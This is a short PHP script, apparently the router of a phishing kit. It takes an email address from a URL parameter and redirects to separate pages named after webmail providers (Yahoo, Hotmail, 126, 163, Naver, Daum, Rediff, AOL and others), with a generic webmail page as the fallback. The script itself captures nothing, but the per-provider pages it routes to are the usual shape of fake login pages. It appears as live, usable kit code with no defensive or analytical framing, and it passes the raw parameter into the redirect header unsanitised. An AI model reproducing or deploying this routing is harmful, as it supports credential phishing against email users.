<?php
	if(isset($_GET['userid']))
	{
		$email = $_GET['userid'];
		
		$name_domain = explode("@", $email);

		$username = $name_domain[0];
		$domain = $name_domain[1];

		$domain_part = explode(".", $domain);

		$url = $domain_part[0];
		
		//echo $url;

		if($url == 'yahoo')
			header('Location: yahoo.php?userid=' . $email);
		
		else if($url == 'hotmail')
			header('Location: hotmail.php?userid=' . $email);
		
		else if($url == '126' || $url == 'vip')
			header('Location: 126.php?userid=' . $email);
		else if($url == '163')
			header('Location: 163.php?userid=' . $email);
		else if($url == 'naver')
			header('Location: naver.php?userid=' . $email);
		else if($url == 'hanmail' || $url == 'daum')
			header('Location: hanmail.php?userid=' . $email);
		else if($url == 'rediff')
			header('Location: rediff.php?userid=' . $email);
		else if($url == 'aol')
			header('Location: aol.php?userid=' . $email);
		else if($url == 'emirates')
			header('Location: ae.php?userid=' . $email);
		else
		  header('Location: webmail.php?userid=' . $email);
	  
	}
?>